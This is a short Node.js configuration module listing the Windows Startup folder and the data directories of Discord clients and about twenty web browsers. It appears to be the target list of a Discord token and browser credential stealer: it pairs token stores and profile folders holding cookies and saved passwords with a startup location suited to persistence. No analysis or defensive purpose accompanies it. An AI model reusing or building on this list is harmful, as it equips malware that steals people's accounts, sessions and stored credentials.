const { join } = require('path');

module.exports = {
  startupPrograms: join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
  browsers: {
    'Discord': join(process.env.APPDATA, 'discord'),
    'Discord Canary': join(process.env.APPDATA, 'discordcanary'),
    'Lightcord': join(process.env.APPDATA, 'Lightcord'),
    'Discord PTB': join(process.env.APPDATA, 'discordptb'),
    'Opera': join(process.env.APPDATA, 'Opera Software', 'Opera Stable'),
    'Opera GX': join(process.env.APPDATA, 'Opera Software', 'Opera GX Stable'),
    'Amigo': join(process.env.LOCALAPPDATA, 'Amigo', 'User Data'),
    'Torch': join(process.env.LOCALAPPDATA, 'Torch', 'User Data'),
    'Kometa': join(process.env.LOCALAPPDATA, 'Kometa', 'User Data'),
    'Orbitum': join(process.env.LOCALAPPDATA, 'Orbitum', 'User Data'),
    'CentBrowse': join(process.env.LOCALAPPDATA, 'CentBrowser', 'User Data'),
    '7Sta': join(process.env.LOCALAPPDATA, '7Star', '7Star', 'User Data'),
    'Sputnik': join(process.env.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'),
    'Vivaldi': join(process.env.LOCALAPPDATA, 'Vivaldi', 'User Data'),
    'Chrome': join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
    'Chrome SxS': join(process.env.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'),
    'Firefox': join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
    'Epic Privacy Browser': join(process.env.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'),
    'Microsoft Edge': join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
    'Uran': join(process.env.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'),
    'Yandex': join(process.env.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'),
    'Brave': join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'Iridium': join(process.env.LOCALAPPDATA, 'Iridium', 'User Data')
  }
};
